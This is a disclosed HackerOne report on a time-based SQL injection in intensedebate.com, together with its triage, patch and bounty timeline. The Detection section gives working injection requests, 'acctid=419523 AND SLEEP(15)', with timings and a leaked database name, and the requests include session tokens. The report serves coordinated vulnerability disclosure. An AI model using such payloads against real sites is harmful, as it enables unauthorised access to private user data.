---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/critical
  - cwe/sql-injection
  - env/web
  - stack/php
substate: "resolved"
weakness: "SQL Injection"
enriched: true
body: true
date: 2021-01-01
submitted: 2020-11-24T22:49:14.934Z
bounty_usd: null
votes: 80
cve: []
program: "[[programs/automattic|Automattic]]"
reporter: "fuzzme"
source: "https://hackerone.com/reports/1042746"
title: "[intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php"
---
# [intensedebate.com] SQL Injection Time Based on /changeReplaceOpt.php

> **Severity:** Critical | **Bounty:** undisclosed | **Votes:** 80 | **Program:** Automattic | **Disclosed:** 2021-01-01

- Report: [https://hackerone.com/reports/1042746](https://hackerone.com/reports/1042746)
- CWE: SQL Injection
- Submitted: 2020-11-24T22:49:14.934Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary 

Hello, i have found a SQLI Injection Time Based on `https://www.intensedebate.com/changeReplaceOpt.php`.

The parameter `$_GET['acctid']` is vulnerable.



## Detection

I have inject a MySQL function `sleep()`,  and it works.


```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(15) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

Response time: 15 414 millis.


```
GET /changeReplaceOpt.php?&opt=1&acctid=419523%20AND%20SLEEP(7) HTTP/1.1
Host: www.intensedebate.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:82.0) Gecko/20100101 Firefox/82.0
Accept: */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Connection: close
Referer: https://www.intensedebate.com/install-t
Cookie: country_code=FR; login_pref=IDC; idcomments_userid=26745306; idcomments_token=2008983fa4c2434ecc83a8c2bec380d3%7C1607463572
```

7 486 millis.

## POC 

database() : id_commxn2s


Thank you, good bye.

## Impact

Full database access holding private user information.

## Timeline

- **Report Filed**
- **2020-11-25** @xknown: Thank you for your submission. Your report will be reviewed and we'll get back to you shortly.
- **2020-11-25** @xknown: Hi @fuzzme, thanks again for the report. We deployed a patch to address this issue. Before marking it as resolved, we are still looking for other places that might need a similar hardening patch.
- **Report Triaged**
- **2020-11-25** @fuzzme: Hello, many thanks @xknown ! :) Ok i going to try find others vulnerables endpoints.
- **2020-11-26** @fuzzme: Hi, a other SQL Injection time based.

Vulnerable Url : `https://intensedebate.com/js/commentAction/?data={}`
Vulnerable Parameter (GET) : `data['params']['acctid']` 
POC : Attachments file > `sqli2.mp4` , `sleep7_2.png` and `sleep15_2.png`
- **Report Resolved**
- **Bounty Awarded**
- **2020-12-04** @fuzzme: Hi @xknown, thank you for the bounty.
- **Agreed On Going Public**
- **2020-12-21** @fuzzme: @xknown, @Automattic  update ?
- **Bounty Awarded**
- **Agreed On Going Public**
- **Report Became Public**
